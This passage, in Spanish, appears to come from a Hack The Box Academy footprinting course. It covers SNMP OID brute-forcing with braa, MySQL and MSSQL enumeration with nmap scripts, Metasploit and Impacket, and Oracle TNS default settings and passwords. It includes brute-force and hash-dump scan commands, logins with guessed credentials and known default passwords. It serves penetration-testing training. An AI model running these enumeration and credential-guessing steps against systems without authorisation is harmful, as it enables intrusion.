A menudo, cuando ciertas cadenas de comunidad están vinculadas a direcciones IP específicas, se nombran con el nombre de host del host y, a veces, incluso se agregan símbolos a estos nombres para hacerlos más difíciles de identificar. Sin embargo, si imaginamos una extensa red con más de 100 servidores diferentes administrados mediante SNMP, las etiquetas, en ese caso, tendrán algún patrón. Por lo tanto, podemos usar diferentes reglas para adivinarlas. Podemos usar la herramienta [crujir](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) para crear listas de palabras personalizadas. Crear listas de palabras personalizadas no es una parte esencial de este módulo, pero se pueden encontrar más detalles en el módulo [Cracking Contraseñas Con Hashcat](https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat).

Una vez que conocemos una cadena comunitaria, podemos usarla con [braa](https://github.com/mteg/braa) para forzar brutamente los OID individuales y enumerar la información detrás de ellos.

#### Braa

  SNMP

```shell-session
vcrdcr@htb[/htb]$ sudo apt install braa
vcrdcr@htb[/htb]$ braa <community string>@<IP>:.1.3.6.*   # Syntax
vcrdcr@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*

10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78
...SNIP...
```

Una vez más, nos gustaría señalar que la configuración independiente del servicio SNMP nos traerá una gran variedad de experiencias diferentes que ningún tutorial puede reemplazar. Por lo tanto, recomendamos encarecidamente configurar una VM con SNMP, experimentar con ella y probar diferentes configuraciones. SNMP puede ser una bendición para un administrador de sistemas I.T., así como una maldición para los analistas y gerentes de seguridad por igual.


# MySQL

---

`MySQL` es un sistema de gestión de bases de datos relacionales SQL de código abierto desarrollado y compatible con Oracle. Una base de datos es simplemente una colección estructurada de datos organizados para un fácil uso y recuperación. El sistema de base de datos puede procesar rápidamente grandes cantidades de datos con alto rendimiento. Dentro de la base de datos, el almacenamiento de datos se realiza de manera que ocupe el menor espacio posible. La base de datos se controla utilizando el [Lenguaje de base de datos SQL](https://www.w3schools.com/sql/sql_intro.asp). MySQL funciona de acuerdo con el `client-server principle` y consiste en un servidor MySQL y uno o más clientes MySQL. El servidor MySQL es el sistema real de gestión de bases de datos. Se encarga del almacenamiento y distribución de datos. Los datos se almacenan en tablas con diferentes columnas, filas y tipos de datos. Estas bases de datos a menudo se almacenan en un solo archivo con la extensión de archivo `.sql`, por ejemplo, como `wordpress.sql`.

#### Clientes MySQL

Los clientes de MySQL pueden recuperar y editar los datos utilizando consultas estructuradas al motor de base de datos. La inserción, eliminación, modificación y recuperación de datos se realiza utilizando el lenguaje de base de datos SQL. Por lo tanto, MySQL es adecuado para administrar muchas bases de datos diferentes a las que los clientes pueden enviar múltiples consultas simultáneamente. Dependiendo del uso de la base de datos, el acceso es posible a través de una red interna o de Internet pública.

Uno de los mejores ejemplos de uso de bases de datos es el CMS WordPress. WordPress almacena todas las publicaciones, nombres de usuario y contraseñas creadas en su propia base de datos, a la que solo se puede acceder desde el localhost. Sin embargo, como se explica con más detalle en el módulo [Introducción a las Aplicaciones Web](https://academy.hackthebox.com/course/preview/introduction-to-web-applications), hay estructuras de bases de datos que también se distribuyen en múltiples servidores.

#### Bases de datos MySQL

MySQL es ideal para aplicaciones como `dynamic websites`, donde la sintaxis eficiente y la alta velocidad de respuesta son esenciales. A menudo se combina con un sistema operativo Linux, PHP y un servidor web Apache y también se conoce en esta combinación como [LÁMPARA](https://en.wikipedia.org/wiki/LAMP_\(software_bundle\)) (Linux, Apache, MySQL, PHP), o cuando se utiliza Nginx, como [LEMP](https://lemp.io/). En un alojamiento web con base de datos MySQL, esto sirve como una instancia central en la que se almacena el contenido requerido por los scripts PHP. Entre estos están:

|||||
|---|---|---|---|
|Encabezados|Textos|Meta etiquetas|Formularios|
|Clientes|Nombres de usuario|Administradores|Moderadores|
|Direcciones de correo electrónico|Información del usuario|Permisos|Contraseñas|
|Enlaces externos/Internos|Enlaces a Archivos|Contenidos específicos|Valores|

Los datos sensibles como las contraseñas pueden ser almacenados en su forma de texto sin formato por MySQL; sin embargo, generalmente son encriptados de antemano por los scripts PHP utilizando métodos seguros como [Una Vía de Encriptación](https://en.citizendium.org/wiki/One-way_encryption).

#### Comandos MySQL

Una base de datos MySQL traduce los comandos internamente en código ejecutable y realiza las acciones solicitadas. La aplicación web informa al usuario si se produce un error durante el procesamiento, que varios `SQL injections` puede provocar. A menudo, estas descripciones de error contienen información importante y confirman, entre otras cosas, que la aplicación web interactúa con la base de datos de una manera diferente a la que pretendían los desarrolladores.

La aplicación web envía la información generada al cliente si los datos se procesan correctamente. Esta información puede ser los extractos de datos de una tabla o registros necesarios para su posterior procesamiento con inicios de sesión, funciones de búsqueda, etc. Los comandos SQL pueden mostrar, modificar, agregar o eliminar filas en tablas. Además, SQL también puede cambiar la estructura de las tablas, crear o eliminar relaciones e índices, y administrar usuarios.

`MariaDB`, que a menudo está conectado con MySQL, es una bifurcación del código MySQL original. Esto se debe a que el desarrollador principal de MySQL dejó la empresa `MySQL AB` después de que fue adquirido por `Oracle` y desarrolló otro sistema de gestión de bases de datos SQL de código abierto basado en el código fuente de MySQL y lo llamó MariaDB.

---

## Configuración Predeterminada

La gestión de bases de datos SQL y sus configuraciones es un tema muy amplio. Es tan grande que profesiones enteras, como `database administrator`, tratar con casi nada más que bases de datos. Estas estructuras se vuelven muy grandes rápidamente, y su planificación puede complicarse. Entre otras cosas, la gestión de DB es una competencia central para `software developers` pero también `information security analysts`. Cubrir esta área por completo iría más allá del alcance de este módulo. Por lo tanto, recomendamos configurar una instancia MySQL/MariaDB para experimentar con las diversas configuraciones para comprender mejor la funcionalidad disponible y las opciones de configuración. Echemos un vistazo a la configuración predeterminada de MySQL.

#### Configuración Predeterminada

  MySQL

```shell-session
vcrdcr@htb[/htb]$ sudo apt install mysql-server -y
vcrdcr@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'

[client]
port		= 3306
socket		= /var/run/mysqld/mysqld.sock

[mysqld_safe]
pid-file	= /var/run/mysqld/mysqld.pid
socket		= /var/run/mysqld/mysqld.sock
nice		= 0

[mysqld]
skip-host-cache
skip-name-resolve
user		= mysql
pid-file	= /var/run/mysqld/mysqld.pid
socket		= /var/run/mysqld/mysqld.sock
port		= 3306
basedir		= /usr
datadir		= /var/lib/mysql
tmpdir		= /tmp
lc-messages-dir	= /usr/share/mysql
explicit_defaults_for_timestamp

symbolic-links=0

!includedir /etc/mysql/conf.d/
```

---

## Configuración Peligrosa

Muchas cosas se pueden configurar mal con MySQL. Podemos mirar con más detalle el [Referencia mySQL](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) para determinar qué opciones se pueden hacer en la configuración del servidor. Las principales opciones que son relevantes para la seguridad son:

|**Configuración**|**Descripción**|
|---|---|
|`user`|Establece qué usuario ejecutará el servicio MySQL como.|
|`password`|Establece la contraseña para el usuario de MySQL.|
|`admin_address`|La dirección IP en la que escuchar las conexiones TCP/IP en la interfaz de red administrativa.|
|`debug`|Esta variable indica la configuración de depuración actual|
|`sql_warnings`|Esta variable controla si las instrucciones INSERT de una sola fila producen una cadena de información si se producen advertencias.|
|`secure_file_priv`|Esta variable se utiliza para limitar el efecto de las operaciones de importación y exportación de datos.|

La configuración `user`, `password`, y `admin_address` son relevantes para la seguridad porque las entradas se realizan en texto sin formato. A menudo, los derechos para el archivo de configuración del servidor MySQL no se asignan correctamente. Si obtenemos otra forma de leer archivos o incluso un shell, podemos ver el archivo y el nombre de usuario y contraseña para el servidor MySQL. Supongamos que no existen otras medidas de seguridad para evitar el acceso no autorizado. En ese caso, toda la base de datos y toda la información de los clientes existentes, direcciones de correo electrónico, contraseñas y datos personales se pueden ver e incluso editar.

El `debug` y `sql_warnings` la configuración proporciona una salida de información detallada en caso de errores, que son esenciales para el administrador, pero no deben ser vistos por otros. Esta información a menudo contiene contenido sensible, que podría detectarse por prueba y error para identificar nuevas posibilidades de ataque. Estos mensajes de error a menudo se muestran directamente en aplicaciones web. En consecuencia, las inyecciones SQL podrían manipularse incluso para que el servidor MySQL ejecute comandos del sistema. Esto se discute y se muestra en el módulo [Fundamentos de Inyección SQL](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) y [Esenciales SQLMap](https://academy.hackthebox.com/course/preview/sqlmap-essentials).

---

## Huella del Servicio

Hay muchas razones por las que se puede acceder a un servidor MySQL desde una red externa. Sin embargo, está lejos de ser una de las mejores prácticas, y siempre podemos encontrar bases de datos a las que podamos llegar. A menudo, estas configuraciones solo estaban destinadas a ser temporales, pero fueron olvidadas por los administradores. Esta configuración del servidor también podría usarse como solución alternativa debido a un problema técnico. Por lo general, el servidor MySQL se ejecuta en `TCP port 3306`, y podemos escanear este puerto con `Nmap` para obtener información más detallada.

#### Escaneo de MySQL Server

  MySQL

```shell-session
vcrdcr@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Accounts: 
|     root:<empty> - Valid credentials
|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed (use -d to debug)
|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
|_  Auth Plugin Name: caching_sha2_password
|_mysql-users: ERROR: Script execution failed (use -d to debug)
|_mysql-variables: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
```

Al igual que con todos nuestros escaneos, debemos tener cuidado con los resultados y confirmar manualmente la información obtenida porque parte de la información podría resultar ser un falso positivo. Este escaneo anterior es un excelente ejemplo de esto, ya que sabemos con certeza que el servidor MySQL de destino no usa una contraseña vacía para el usuario `root`, pero una contraseña fija. Podemos probar esto con el siguiente comando:

#### Interacción con el servidor MySQL

  MySQL

```shell-session
vcrdcr@htb[/htb]$ mysql -u root -h 10.129.14.132

ERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)
```

Por ejemplo, si usamos una contraseña que hemos adivinado o encontrado a través de nuestra investigación, podremos iniciar sesión en el servidor MySQL y ejecutar algunos comandos.

  MySQL

```shell-session
vcrdcr@htb[/htb]$ mysql -u root -pP4SSw0rd -h 10.129.14.128

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)                                                         
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                     
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                           
      
MySQL [(none)]> show databases;                                                                          
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.006 sec)


MySQL [(none)]> select version();
+-------------------------+
| version()               |
+-------------------------+
| 8.0.27-0ubuntu0.20.04.1 |
+-------------------------+
1 row in set (0.001 sec)


MySQL [(none)]> use mysql;
MySQL [mysql]> show tables;
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
...SNIP...
| user                                                 |
+------------------------------------------------------+
37 rows in set (0.002 sec)
```

Si miramos las bases de datos existentes, veremos que ya existen varias. Las bases de datos más importantes para el servidor MySQL son las `system schema` (`sys`) y `information schema` (`information_schema`). El esquema del sistema contiene tablas, información y metadatos necesarios para la gestión. Más sobre esta base de datos se puede encontrar en el [manual de referencia](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes) de MySQL.

  MySQL

```shell-session
mysql> use sys;
mysql> show tables;  

+-----------------------------------------------+
| Tables_in_sys                                 |
+-----------------------------------------------+
| host_summary                                  |
| host_summary_by_file_io                       |
| host_summary_by_file_io_type                  |
| host_summary_by_stages                        |
| host_summary_by_statement_latency             |
| host_summary_by_statement_type                |
| innodb_buffer_stats_by_schema                 |
| innodb_buffer_stats_by_table                  |
| innodb_lock_waits                             |
| io_by_thread_by_latency                       |
...SNIP...
| x$waits_global_by_latency                     |
+-----------------------------------------------+


mysql> select host, unique_users from host_summary;

+-------------+--------------+                   
| host        | unique_users |                   
+-------------+--------------+                   
| 10.129.14.1 |            1 |                   
| localhost   |            2 |                   
+-------------+--------------+                   
2 rows in set (0,01 sec)  
```

El `information schema` también es una base de datos que contiene metadatos. Sin embargo, estos metadatos se recuperan principalmente del `system schema` base de datos. La razón de la existencia de estos dos es el estándar ANSI/ISO que se ha establecido. `System schema` es un catálogo de sistemas de Microsoft para servidores SQL y contiene mucha más información que el `information schema`.

Algunos de los comandos que debemos recordar y escribir para trabajar con bases de datos MySQL se describen a continuación en la tabla.

|**Comando**|**Descripción**|
|---|---|
|`mysql -u <user> -p<password> -h <IP address>`|Conéctese al servidor MySQL. Debería haber **no** sea un espacio entre la bandera '-p' y la contraseña.|
|`show databases;`|Mostrar todas las bases de datos.|
|`use <database>;`|Seleccione una de las bases de datos existentes.|
|`show tables;`|Mostrar todas las tablas disponibles en la base de datos seleccionada.|
|`show columns from <table>;`|Mostrar todas las columnas en la tabla seleccionada.|
|`select * from <table>;`|Mostrar todo en la tabla deseada.|
|`select * from <table> where <column> = "<string>";`|Búsqueda necesaria `string` en la tabla deseada.|

Debemos saber interactuar con diferentes bases de datos. Por lo tanto, recomendamos instalar y configurar un servidor MySQL en una de nuestras VM para experimentación. También hay una amplia cobertura [problemas de seguridad](https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html) sección en el manual de referencia que cubre las mejores prácticas para asegurar servidores MySQL. Deberíamos usar esto al configurar nuestro servidor MySQL para comprender mejor por qué algo podría no funcionar.


# MSSQL

---

[SQL Microsoft](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) es el sistema de gestión de bases de datos relacionales basado en SQL de Microsoft. A diferencia de MySQL, que discutimos en la última sección, MSSQL es de código cerrado y se escribió inicialmente para ejecutarse en sistemas operativos Windows. Es popular entre los administradores y desarrolladores de bases de datos al crear aplicaciones que se ejecutan en Microsoft .Marco NET debido a su fuerte apoyo nativo para .NET. Hay versiones de MSSQL que se ejecutarán en Linux y MacOS, pero es más probable que encontremos instancias MSSQL en objetivos que ejecutan Windows.

#### Clientes MSSQL

[SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) viene como una característica que se puede instalar con el paquete de instalación MSSQL o se puede descargar e instalar por separado. Se instala comúnmente en el servidor para la configuración inicial y la gestión a largo plazo de las bases de datos por parte de los administradores. Tenga en cuenta que, dado que SSMS es una aplicación del lado del cliente, se puede instalar y usar en cualquier sistema desde el que un administrador o desarrollador planee administrar la base de datos. No solo existe en el servidor que aloja la base de datos. Esto significa que podríamos encontrarnos con un sistema vulnerable con SSMS con credenciales guardadas que nos permitan conectarnos a la base de datos. La imagen a continuación muestra SSMS en acción.

![SQL Server Management Studio muestra Object Explorer con la base de datos 'Empleados' expandida, mostrando tablas, vistas y otros objetos de base de datos.](https://academy.hackthebox.com/storage/modules/112/ssms.png)

Se pueden usar muchos otros clientes para acceder a una base de datos que se ejecuta en MSSQL. Incluyendo pero no limitado a:

||||||
|---|---|---|---|---|
|[mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)|[PowerShell SQL Server](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)|[HeidiSQL](https://www.heidisql.com/)|[SQLPro](https://www.macsqlclient.com/)|[Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)|

De los clientes MSSQL mencionados anteriormente, los pentesters pueden encontrar que el mssqlclient.py de Impacket es el más útil debido a que el proyecto Impacket de SecureAuthCorp está presente en muchas distribuciones de pentesting en la instalación. Para encontrar si y dónde se encuentra el cliente en nuestro host, podemos utilizar el siguiente comando:

  MSSQL

```shell-session
vcrdcr@htb[/htb]$ locate mssqlclient

/usr/bin/impacket-mssqlclient
/usr/share/doc/python3-impacket/examples/mssqlclient.py
```

#### bases de datos MSSQL

MSSQL tiene bases de datos de sistema predeterminadas que pueden ayudarnos a comprender la estructura de todas las bases de datos que pueden estar alojadas en un servidor de destino. Aquí están las bases de datos predeterminadas y una breve descripción de cada:

|Base de Datos del Sistema Predeterminada|Descripción|
|---|---|
|`master`|Rastrea toda la información del sistema para una instancia de servidor SQL|
|`model`|Base de datos de plantillas que actúa como una estructura para cada nueva base de datos creada. Cualquier configuración cambiada en la base de datos del modelo se reflejará en cualquier nueva base de datos creada después de los cambios en la base de datos del modelo|
|`msdb`|El Agente de SQL Server utiliza esta base de datos para programar trabajos y alertas|
|`tempdb`|Almacena objetos temporales|
|`resource`|Base de datos de solo lectura que contiene objetos del sistema incluidos con el servidor SQL|

Fuente de la tabla: [Bases de datos del sistema Microsoft Doc](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15)

---

## Configuración Predeterminada

Cuando un administrador inicialmente instala y configura MSSQL para que sea accesible a la red, es probable que el servicio SQL se ejecute como `NT SERVICE\MSSQLSERVER`. La conexión desde el lado del cliente es posible a través de la autenticación de Windows y, de forma predeterminada, el cifrado no se aplica al intentar conectarse.

![Ventana de conexión de SQL Server que muestra las opciones para el tipo de servidor, el nombre del servidor 'ILF-SQL-01' y la autenticación de Windows.](https://academy.hackthebox.com/storage/modules/112/auth.png)

La autenticación se establece en `Windows Authentication` significa que el sistema operativo Windows subyacente procesará la solicitud de inicio de sesión y utilizará la base de datos SAM local o el controlador de dominio (alojamiento de Active Directory) antes de permitir la conectividad al sistema de administración de la base de datos. El uso de Active Directory puede ser ideal para auditar la actividad y controlar el acceso en un entorno de Windows, pero si una cuenta se ve comprometida, podría provocar una escalada de privilegios y un movimiento lateral en un entorno de dominio de Windows. Al igual que con cualquier sistema operativo, servicio, función de servidor o aplicación, puede ser beneficioso configurarlo en una VM desde la instalación hasta la configuración para comprender todas las configuraciones predeterminadas y los posibles errores que el administrador podría cometer.

---

## Configuración Peligrosa

Puede ser beneficioso ubicarnos en la perspectiva de un administrador de TI cuando estamos en un compromiso. Esta mentalidad puede ayudarnos a recordar buscar varias configuraciones que pueden haber sido mal configuradas o configuradas de manera peligrosa por un administrador. Un día de trabajo en TI puede estar bastante ocupado, con muchos proyectos diferentes sucediendo simultáneamente y la presión para realizar con velocidad y precisión es una realidad en muchas organizaciones, los errores se pueden cometer fácilmente. Solo se necesita una pequeña configuración errónea que podría comprometer un servidor o servicio crítico en la red. Esto se aplica a casi todos los servicios de red y roles de servidor que se pueden configurar, incluido MSSQL.

Esta no es una lista extensa porque hay innumerables formas en que los administradores pueden configurar las bases de datos MSSQL en función de las necesidades de sus respectivas organizaciones. Podemos beneficiarnos de investigar lo siguiente:

- Clientes MSSQL que no utilizan cifrado para conectarse al servidor MSSQL
    
- El uso de certificados autofirmados cuando se utiliza el cifrado. Es posible falsificar certificados autofirmados
    
- El uso de [tuberías nombradas](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
    
- Débil y predeterminado `sa` credenciales. Los administradores pueden olvidarse de deshabilitar esta cuenta
    

---

## Huella del Servicio

Hay muchas maneras en que podemos abordar la huella del servicio MSSQL, cuanto más específicos podamos obtener con nuestros escaneos, más información útil podremos recopilar. NMAP tiene scripts mssql predeterminados que se pueden usar para apuntar al puerto tcp predeterminado `1433` que MSSQL escucha en.

El escaneo NMAP con guión a continuación nos proporciona información útil. Podemos ver el `hostname`, `database instance name`, `software version of MSSQL` y `named pipes are enabled`. Nos beneficiaremos de agregar estos descubrimientos a nuestras notas.

#### NMAP MSSQL Script Scan

  MSSQL

```shell-session
vcrdcr@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST
Nmap scan report for 10.129.201.248
Host is up (0.15s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-dac: 
|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query
|_    Clustered: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

También podemos usar Metasploit para ejecutar un escáner auxiliar llamado `mssql_ping` eso escaneará el servicio MSSQL y proporcionará información útil en nuestro proceso de impresión.

#### MSSQL Ping en Metasploit

  MSSQL

```shell-session
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

rhosts => 10.129.201.248


msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Conexión con Mssqlclient.py

Si podemos adivinar u obtener acceso a credenciales, esto nos permite conectarnos remotamente al servidor MSSQL y comenzar a interactuar con bases de datos usando T-SQL (`Transact-SQL`). La autenticación con MSSQL nos permitirá interactuar directamente con las bases de datos a través del Motor de base de datos SQL. Desde Pwnbox o un host de ataque personal, podemos usar mssqlclient.py de Impacket para conectar como se ve en la salida a continuación. Una vez conectado al servidor, puede ser bueno obtener una disposición de la tierra y enumerar las bases de datos presentes en el sistema.

  MSSQL

```shell-session
vcrdcr@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL> select name from sys.databases

name                                                                                                                               

--------------------------------------------------------------------------------------

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

Transactions    
```


# TNS Oracle

---

El `Oracle Transparent Network Substrate` (`TNS`) el servidor es un protocolo de comunicación que facilita la comunicación entre bases de datos y aplicaciones de Oracle a través de redes. Inicialmente introducido como parte de la [Servicios Oracle Net](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) suite de software, TNS admite varios protocolos de red entre bases de datos Oracle y aplicaciones cliente, como `IPX/SPX` y `TCP/IP` pilas de protocolo. Como resultado, se ha convertido en una solución preferida para administrar bases de datos grandes y complejas en las industrias de atención médica, finanzas y minoristas. Además, su mecanismo de cifrado incorporado garantiza la seguridad de los datos transmitidos, lo que lo convierte en una solución ideal para entornos empresariales donde la seguridad de los datos es primordial.

Con el tiempo, TNS se ha actualizado para admitir tecnologías más nuevas, incluyendo `IPv6` y `SSL/TLS` cifrado que lo hace más adecuado para los siguientes fines:

|||||
|---|---|---|---|
|Resolución de nombre|Gestión de conexiones|Equilibrio de carga|Seguridad|

Además, permite el cifrado entre la comunicación cliente y servidor a través de una capa adicional de seguridad sobre la capa de protocolo TCP/IP. Esta característica ayuda a proteger la arquitectura de la base de datos contra el acceso no autorizado o ataques que intentan comprometer los datos en el tráfico de la red. Además, proporciona herramientas y capacidades avanzadas para administradores y desarrolladores de bases de datos, ya que ofrece herramientas integrales de monitoreo y análisis del rendimiento, informes de errores y capacidades de registro, administración de cargas de trabajo y tolerancia a fallas a través de servicios de bases de datos.

---

## Configuración Predeterminada

La configuración predeterminada del servidor Oracle TNS varía según la versión y la edición del software Oracle instalado. Sin embargo, algunas configuraciones comunes generalmente se configuran de forma predeterminada en Oracle TNS. De forma predeterminada, el oyente escucha las conexiones entrantes en el `TCP/1521` puerto. Sin embargo, este puerto predeterminado se puede cambiar durante la instalación o más tarde en el archivo de configuración. El oyente TNS está configurado para admitir varios protocolos de red, incluyendo `TCP/IP`, `UDP`, `IPX/SPX`, y `AppleTalk`. El oyente también puede admitir múltiples interfaces de red y escuchar en direcciones IP específicas o en todas las interfaces de red disponibles. De forma predeterminada, Oracle TNS se puede administrar de forma remota en `Oracle 8i`/`9i` pero no en Oracle 10g/11g.

La configuración predeterminada del oyente TNS también incluye algunas características básicas de seguridad. Por ejemplo, el oyente solo aceptará conexiones de hosts autorizados y realizará la autenticación básica utilizando una combinación de nombres de host, direcciones IP y nombres de usuario y contraseñas. Además, el oyente utilizará Oracle Net Services para cifrar la comunicación entre el cliente y el servidor. Los archivos de configuración para Oracle TNS se llaman `tnsnames.ora` y `listener.ora` y se encuentran típicamente en el `$ORACLE_HOME/network/admin` directorio. El archivo de texto sin formato contiene información de configuración para instancias de base de datos Oracle y otros servicios de red que utilizan el protocolo TNS.

Oracle TNS se utiliza a menudo con otros servicios de Oracle como Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, servidores web y muchos más. Se han realizado muchos cambios para la instalación predeterminada de los servicios de Oracle. Por ejemplo, Oracle 9 tiene una contraseña predeterminada `CHANGE_ON_INSTALL`, mientras que Oracle 10 no tiene un conjunto de contraseñas predeterminado. El servicio Oracle DBSNMP también utiliza una contraseña predeterminada `dbsnmp` que deberíamos recordar cuando nos encontremos con este. Otro ejemplo sería que muchas organizaciones todavía usan el `finger` servicio junto con Oracle, que puede poner en riesgo el servicio de Oracle y hacerlo vulnerable cuando tenemos el conocimiento requerido de un directorio de inicio.

Cada base de datos o servicio tiene una entrada única en el [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) archivo, que contiene la información necesaria para que los clientes se conecten al servicio. La entrada consiste en un nombre para el servicio, la ubicación de red del servicio y el nombre de base de datos o servicio que los clientes deben usar al conectarse al servicio. Por ejemplo, un simple `tnsnames.ora` el archivo puede verse así:

#### Tnsnames.ora

Código: txt

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
